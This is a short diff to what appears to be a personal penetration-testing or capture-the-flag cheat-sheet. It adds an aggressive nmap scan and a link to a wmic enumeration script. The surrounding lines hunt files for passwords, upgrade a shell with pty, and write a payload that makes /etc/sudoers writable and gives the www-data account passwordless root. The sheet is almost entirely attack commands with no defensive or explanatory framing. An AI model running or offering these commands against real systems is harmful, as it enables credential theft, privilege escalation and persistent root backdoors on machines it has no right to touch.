@@ -1,7 +1,7 @@
 grep -iRl "pass" 2>dev/null
 find . -maxdepth 1 -name "*string*" -print
 
-nmapauto.sh 192.168.2.111 Recon
+nmapauto.sh 192.168.2.111 Recon     / nmap -v -sS -A 192.x.x.x
 dirsearch.py -u http://192.168.1.72/ -e php -x 301,302,403
 
 dirb
@@ -16,3 +16,5 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 
 dir confCons.xml /s /p
+
+wmic enum https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4
